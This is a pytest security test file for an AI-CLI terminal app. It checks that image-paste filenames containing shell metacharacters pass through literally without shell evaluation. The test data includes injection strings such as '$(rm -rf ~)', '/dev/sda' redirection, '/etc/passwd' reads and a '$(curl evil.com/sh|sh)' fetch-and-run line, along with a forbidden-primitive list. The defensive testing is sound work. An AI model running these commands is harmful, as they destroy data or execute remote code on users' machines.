"""Security: image paste path with shell metacharacters
(#55 / #127, audit § 6.7 #28).

Threat model: a malicious actor crafts an image filename
containing shell metacharacters (`$(...)`, `;rm`, backticks).
If anywhere in the paste pipeline the path is interpolated
into a shell-evaluated context (e.g. spawn argv, system()
call, eval'd template), arbitrary code executes under the
user's UID.

BTerminal's defense:
  1. `format_image_paste_hint(template, path)` uses
     Python's `str.format(path=path)` — pure string
     substitution, NO shell eval.
  2. The bytes fed via VTE `feed_child` go to the AI CLI's
     stdin. Aider treats them as user input text — its shell
     access is sandboxed by aider's own permission model
     (`--yes-always` is the only escape hatch, and that
     applies to aider's edit confirmations, not arbitrary
     shell commands).
  3. The crafted path is NEVER passed to subprocess.run /
     os.system / shell=True invocations from the paste flow.

Three decision branches:
  (a) Command substitution `$(rm -rf ~)` — survives format,
      no eval.
  (b) Command chaining `; rm` — semicolon survives literally.
  (c) Backticks (legacy bash) — survive literally as filename
      characters; no command substitution.

Manual VM smoke (save crafted filename, paste, observe) is
documented in tests/manual/README.md.
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest

from bterminal.helpers import format_image_paste_hint
from bterminal.providers import (
    ProviderRegistry,
    load_providers_config,
    reset_registry,
)


REPO_ROOT = Path(__file__).resolve().parent.parent
HELPERS = REPO_ROOT / "bterminal" / "helpers.py"
TERMINAL_TAB = REPO_ROOT / "bterminal" / "ui" / "terminal_tab.py"


@pytest.fixture(autouse=True)
def _reset_singleton():
    reset_registry()
    yield
    reset_registry()


# ─── Branch (a): $() command substitution ───────────────────────────────


def test_command_substitution_dollar_paren_survives_template_format():
    """Pin: `$(rm -rf ~)` in path → format() substitutes
    LITERALLY into the template. No shell eval, no Python
    f-string trickery. Bytes contain the raw `$(...)` chars."""
    crafted = "/tmp/$(rm -rf ~).png"
    template = "User provided image: {path} — describe it."
    out = format_image_paste_hint(template, crafted)

    # Path embedded LITERALLY
    assert "/tmp/$(rm -rf ~).png" in out
    # Format placeholder consumed (no `{path}` left)
    assert "{path}" not in out
    # Output is a string (not bytes — that's the caller's job)
    assert isinstance(out, str)


def test_command_substitution_with_polish_path_also_safe():
    """Pin: even unicode path with shell metas survives. Pin
    so a refactor that pre-encodes via shlex.quote() doesn't
    accidentally double-escape."""
    crafted = "/home/użytkownik/$(echo PWNED).png"
    template = "Obraz: {path} — opisz."
    out = format_image_paste_hint(template, crafted)
    # Polish + metas all literal
    assert "użytkownik" in out
    assert "$(echo PWNED)" in out


def test_dollar_brace_substitution_also_literal():
    """Variant: `${IFS}cat${IFS}/etc/passwd` — bash variable
    substitution. Pin: also literal."""
    crafted = "/tmp/${IFS}cat${IFS}/etc/passwd.png"
    template = "{path}"
    out = format_image_paste_hint(template, crafted)
    # Literal — no expansion
    assert "${IFS}" in out
    assert out == crafted


# ─── Branch (b): ; rm command chaining ──────────────────────────────────


def test_semicolon_rm_survives_template_format():
    """Pin: `; rm -rf ~/important` survives literally. Path's
    semicolon is treated as filename character, not command
    separator."""
    crafted = "/tmp/foo; rm -rf ~/important.png"
    template = "User provided image: {path}"
    out = format_image_paste_hint(template, crafted)
    assert ";" in out
    assert "rm -rf" in out
    assert crafted in out


def test_pipe_redirection_survives():
    """Pin: `|` and `>` and `<` and `&` — all treated as
    filename chars by format()."""
    crafted = "/tmp/foo|cat>/dev/sda.png"
    template = "{path}"
    out = format_image_paste_hint(template, crafted)
    assert out == crafted
    assert "|" in out
    assert ">" in out


def test_double_ampersand_chain_survives():
    """Pin: `&&` (bash AND chain) literal."""
    crafted = "/tmp/safe.png && rm -rf ~"
    template = "{path}"
    out = format_image_paste_hint(template, crafted)
    assert "&&" in out
    assert "rm -rf" in out


# ─── Branch (c): backticks `cmd` ───────────────────────────────────────


def test_backtick_command_substitution_survives():
    """Pin: backtick-style `whoami` (legacy bash) literal."""
    crafted = "/tmp/`whoami`.png"
    template = "User provided: {path}"
    out = format_image_paste_hint(template, crafted)
    assert "`whoami`" in out
    # Two backticks in output
    assert out.count("`") == 2


def test_nested_dollar_paren_with_backticks():
    """Pin: pathological nesting `$(echo \\`whoami\\`)` literal."""
    crafted = "/tmp/$(echo `whoami`).png"
    template = "{path}"
    out = format_image_paste_hint(template, crafted)
    assert out == crafted
    # Both substitution forms present
    assert "$(" in out
    assert "`" in out


# ─── Source-grep: format() is the ONLY substitution ────────────────────


def test_format_image_paste_hint_uses_str_format_only():
    """Pin: implementation uses `template.format(path=path)`.
    NO subprocess.run, NO os.system, NO shell=True, NO
    eval/exec/compile."""
    src = HELPERS.read_text()
    fn_start = src.find("def format_image_paste_hint")
    fn_end = src.find("\n\ndef ", fn_start + 1)
    if fn_end < 0:
        fn_end = src.find("\nclass ", fn_start + 1)
    body = src[fn_start:fn_end]

    # The canonical substitution call
    assert "template.format(path=path)" in body, (
        "format_image_paste_hint no longer uses .format(path=...) "
        "— check whether shell eval slipped in"
    )

    # Forbidden: no shell eval primitives
    forbidden = [
        "subprocess.run", "subprocess.Popen",
        "os.system", "os.popen",
        "shell=True", "eval(", "exec(",
        "compile(",
    ]
    for pat in forbidden:
        assert pat not in body, (
            f"format_image_paste_hint contains shell-eval-like "
            f"primitive: {pat!r} — security regression"
        )


def test_paste_flow_does_not_call_subprocess_with_path(tmp_path):
    """Pin: `_paste_clipboard_image_path` doesn't pass the
    image path to subprocess.run / os.system. Only writes file
    + feeds bytes via feed_child. PTY layer is the only
    'execution' boundary, and aider treats stdin as text."""
    src = TERMINAL_TAB.read_text()
    fn_start = src.find("def _paste_clipboard_image_path")
    fn_end = src.find("\n    def ", fn_start + 1)
    body = src[fn_start:fn_end]

    forbidden = [
        "subprocess.run", "subprocess.Popen",
        "os.system", "os.popen",
        "shell=True", "eval(", "exec(",
    ]
    for pat in forbidden:
        assert pat not in body, (
            f"_paste_clipboard_image_path contains {pat!r} — "
            f"shell-eval surface for crafted paths"
        )


def test_format_image_paste_in_terminal_tab_does_not_shell_eval():
    """`_format_image_paste_for_provider` is the dispatcher
    that picks template per provider then delegates to
    format_image_paste_hint. Pin: no shell eval in the dispatcher."""
    src = TERMINAL_TAB.read_text()
    fn_start = src.find("def _format_image_paste_for_provider")
    fn_end = src.find("\n    def ", fn_start + 1)
    body = src[fn_start:fn_end]

    forbidden = [
        "subprocess.run", "subprocess.Popen",
        "os.system", "shell=True", "eval(", "exec(",
    ]
    for pat in forbidden:
        assert pat not in body, (
            f"_format_image_paste_for_provider has {pat!r}"
        )


# ─── feed_child receives bytes — not shell eval ────────────────────────


def test_feed_child_receives_literal_bytes_no_pty_metaeval():
    """Pin: VTE feed_child writes raw bytes into the PTY
    pipe. The kernel doesn't interpret them. Aider's stdin
    sees the same bytes; aider treats stdin as natural-language
    user input, NOT a shell command line.

    Source-grep: paste flow encodes string → bytes → feed_child.
    No intermediate shell-quote / shlex layer that would
    paradoxically RE-introduce eval risk."""
    src = TERMINAL_TAB.read_text()
    fn_start = src.find("def _paste_clipboard_image_path")
    fn_end = src.find("\n    def ", fn_start + 1)
    body = src[fn_start:fn_end]

    # The paste path uses encode() somewhere (string → bytes)
    # OR clipboard.set_text() (Gtk pastes text). Pin one of
    # these patterns.
    has_encode = ".encode(" in body or "set_text" in body \
        or "feed_child" in body
    assert has_encode, (
        "paste flow doesn't encode bytes / set clipboard — "
        "delivery mechanism unclear"
    )


def test_format_image_paste_hint_returns_str_not_executed():
    """Pin: return type is str (unicode). Caller is responsible
    for encoding to bytes. A future refactor that returns
    `subprocess.run(['echo', out])` output (executing the
    string!) would fail this isinstance check."""
    crafted = "/tmp/$(date).png"
    out = format_image_paste_hint("{path}", crafted)
    assert isinstance(out, str)
    # Round-trip via UTF-8 — pin no double-encoding
    assert out.encode("utf-8").decode("utf-8") == out
    # Crafted content survives
    assert "$(date)" in out


# ─── Provider-specific paste templates: all defenses identical ─────────


@pytest.mark.parametrize("provider_name", ["copilot", "aider"])
def test_real_provider_template_with_crafted_path(provider_name):
    """Pin: each provider's REAL image_paste_template (from
    defaults.json) handles crafted paths safely. Mirrors the
    actual call site BT uses in `_format_image_paste_for_provider`."""
    reg = ProviderRegistry(config=load_providers_config())
    template = reg.get(provider_name)._argv_spec.get(
        "image_paste_template")
    assert template, f"{provider_name} lost image_paste_template"

    crafted = "/tmp/$(curl evil.com/sh|sh).png"
    out = format_image_paste_hint(template, crafted)
    # Crafted path embedded literal
    assert crafted in out
    # No backslash-escape applied (would double-escape inside
    # the model's prompt; it's NOT a shell context anyway)
    assert "\\$(" not in out


def test_claude_null_template_returns_bare_path_with_metas():
    """Pin: Claude has `image_paste_template=None` (vision
    native). Bare path returned — no wrapping. Crafted metas
    still safe because Claude's API receives it as a string,
    not a shell command."""
    reg = ProviderRegistry(config=load_providers_config())
    template = reg.get("claude")._argv_spec.get(
        "image_paste_template")
    assert template is None

    crafted = "/tmp/`whoami`.png"
    out = format_image_paste_hint(template, crafted)
    # Bare path — no template wrapping
    assert out == crafted


# ─── Defensive: format() with un-substituted placeholders ──────────────


def test_format_with_unknown_placeholder_returns_template_literal():
    """Pin from #69: template with `{unknown}` placeholder →
    KeyError caught, returns template AS-IS (defensive). This
    means a crafted PATH never lands in the output if the
    template is malformed.

    Side effect: a malformed template can't be exploited to
    land the crafted path in a different field."""
    crafted = "/tmp/$(rm -rf ~).png"
    template = "Image: {nonexistent_key}"
    out = format_image_paste_hint(template, crafted)
    # Template returned literal — crafted path NOT in output
    assert out == "Image: {nonexistent_key}"
    assert "$(rm -rf" not in out


def test_format_with_no_placeholder_returns_template_literal():
    """Pin: template without {path} → returned verbatim.
    Crafted path silently dropped — safer than throwing or
    trying to inject."""
    crafted = "/tmp/$(rm).png"
    template = "Static text without placeholder."
    out = format_image_paste_hint(template, crafted)
    assert out == "Static text without placeholder."
    assert "$(rm)" not in out


# ─── Path traversal in paste path ──────────────────────────────────────


def test_path_traversal_segments_survive_literal():
    """Pin: `..` traversal in path → literal. format() doesn't
    resolve. The PASTE flow doesn't validate file paths — it's
    aider's responsibility to refuse traversal if the model
    decides to call its Read tool. Pin literal pass-through."""
    crafted = "/tmp/../../../etc/passwd"
    template = "{path}"
    out = format_image_paste_hint(template, crafted)
    assert out == crafted
    # No symlink resolution / realpath
    assert "../" in out


def test_absolute_then_relative_path_survives():
    crafted = "/tmp/foo/../../etc/shadow"
    out = format_image_paste_hint("{path}", crafted)
    assert out == crafted


# ─── Null byte / control char injection ────────────────────────────────


def test_null_byte_in_path_does_not_truncate_output():
    """Pin: a null byte in the path is preserved by format(). No
    truncation. PTY feed_child writes it verbatim — aider sees
    the null byte (most CLIs treat it as EOF for that line, but
    that's their problem; BT's not introducing the issue)."""
    crafted = "/tmp/foo\x00.png"
    out = format_image_paste_hint("{path}", crafted)
    assert "\x00" in out
    # Length matches — no silent truncation
    assert len(out) == len(crafted)


def test_newline_in_path_survives_literal():
    """Pin: `\\n` in path embedded literally. The model sees a
    multi-line user input but BT doesn't sanitize — by design,
    so legitimate multi-line filenames aren't broken."""
    crafted = "/tmp/foo\nbar.png"
    out = format_image_paste_hint("{path}", crafted)
    assert "\n" in out
    assert out == crafted


def test_carriage_return_in_path_survives_literal():
    """`\\r` carriage return — also literal."""
    crafted = "/tmp/foo\rbar.png"
    out = format_image_paste_hint("{path}", crafted)
    assert "\r" in out


# ─── Quote / escape sequences ──────────────────────────────────────────


def test_double_quotes_in_path_survive():
    crafted = '/tmp/foo "$(rm)" bar.png'
    out = format_image_paste_hint("{path}", crafted)
    # Both quotes + the meta
    assert '"' in out
    assert "$(rm)" in out


def test_single_quotes_in_path_survive():
    crafted = "/tmp/foo '$(rm)' bar.png"
    out = format_image_paste_hint("{path}", crafted)
    assert "'" in out
    assert "$(rm)" in out


def test_backslash_in_path_not_unescaped():
    """Pin: backslash in path treated as literal char. format()
    doesn't process escape sequences."""
    crafted = "/tmp/foo\\$(rm).png"
    out = format_image_paste_hint("{path}", crafted)
    assert "\\$" in out
    assert "$(rm)" in out


# ─── End-to-end via _format_image_paste_for_provider ──────────────────


def test_terminal_tab_dispatcher_passes_crafted_path_safely():
    """Run `_format_image_paste_for_provider` as the integration
    boundary BT uses. Pin: even via the dispatcher (which adds
    session override + global toggle layers), crafted path
    survives literally."""
    from unittest.mock import MagicMock, patch
    from bterminal.ui.terminal_tab import TerminalTab

    tab = MagicMock(spec=TerminalTab)
    tab.ai_config = {"provider": "aider", "name": "x"}
    tab._format_image_paste_for_provider = (
        TerminalTab._format_image_paste_for_provider.__get__(tab)
    )

    crafted = "/tmp/$(rm -rf ~).png"
    out = tab._format_image_paste_for_provider(crafted)
    assert crafted in out, (
        f"crafted path lost or escaped through dispatcher. "
        f"out: {out!r}"
    )
    # No shell eval evidence
    assert "$(rm -rf ~)" in out


# ─── Cross-cutting: helper purity (no side effects) ────────────────────


def test_format_image_paste_hint_is_pure_no_side_effects(tmp_path):
    """Pin: calling format_image_paste_hint with a crafted path
    creates ZERO files / writes ZERO bytes anywhere. Just
    string substitution.

    Regression guard: a future refactor that decides to validate
    the path via os.stat() / open() would create syscall
    surface. Pin: NO syscalls."""
    crafted = "/tmp/$(touch /tmp/PWNED-{}).png".format(
        tmp_path.name)

    files_before = set(tmp_path.iterdir())
    out = format_image_paste_hint("{path}", crafted)
    files_after = set(tmp_path.iterdir())

    assert files_before == files_after
    assert "$(touch" in out  # crafted content embedded


# ─── Migration marker: shlex.quote() addition would be a regression ────


def test_format_image_paste_hint_does_not_shlex_quote():
    """Pin: helper does NOT call `shlex.quote()` on the path.
    Reason: the bytes go to PTY (text), not to a shell command
    line. Adding shlex.quote() would visibly clutter the
    model's prompt with literal escape characters.

    A refactor adding shlex.quote() should EXPLICITLY justify
    why — flipping this pin requires reading the rationale."""
    src = HELPERS.read_text()
    fn_start = src.find("def format_image_paste_hint")
    fn_end = src.find("\n\ndef ", fn_start + 1)
    if fn_end < 0:
        fn_end = src.find("\nclass ", fn_start + 1)
    body = src[fn_start:fn_end]
    assert "shlex.quote" not in body, (
        "format_image_paste_hint now uses shlex.quote — "
        "verify this is intentional + update test expectations"
    )


def test_paste_flow_treats_image_path_as_text_input_not_shell():
    """Cross-cutting: BT's image paste delivers the formatted
    string into the AI CLI's stdin via PTY. PTY = text input
    channel. The crafted metacharacters are user-controlled
    text, NOT shell commands.

    The risk surface is only if the AI MODEL itself decides to
    invoke the user's text in shell context — that's the model's
    responsibility (claude-code uses sandboxed Read tool;
    aider has explicit `--yes-always` confirmation by default).

    Pin: BT itself never escalates the crafted text into shell."""
    src = TERMINAL_TAB.read_text()
    # The paste flow writes text into VTE via feed_child or
    # paste_clipboard — both are text-channel APIs
    paste_fn = src.find("def _paste_clipboard_image_path")
    paste_end = src.find("\n    def ", paste_fn + 1)
    body = src[paste_fn:paste_end]

    # Either feed_child(bytes) or paste_clipboard
    text_delivery = ("feed_child" in body
                     or "paste_clipboard" in body
                     or "set_text" in body)
    assert text_delivery, (
        "paste flow doesn't use a text-channel delivery — "
        "check whether shell-channel got introduced"
    )

    # No subprocess
    assert "subprocess" not in body
